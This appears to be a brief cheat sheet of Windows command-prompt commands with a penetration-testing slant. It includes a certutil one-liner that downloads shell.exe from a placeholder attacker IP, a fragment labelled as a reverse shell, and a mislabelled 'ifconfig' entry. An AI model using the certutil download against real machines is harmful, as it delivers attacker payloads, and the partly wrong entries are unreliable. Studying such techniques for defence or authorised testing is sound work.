## cmd

type - opens file

dir - lists files in directory

cd - change directory

#### get ip:
```cmd
ifconfig 
```

### open cmd reverse
```cmd
String cmd="cmd.exe";
```

### certutil
Certutil is a command-line tool for managing and verifying Certificate Services and components.
- **But** can be used to download files from a remote server.
```sh
certutil -urlcache -f <attacker-ip>/shell.exe # This command downloads a file from a remote server and saves it to the local machine.
```

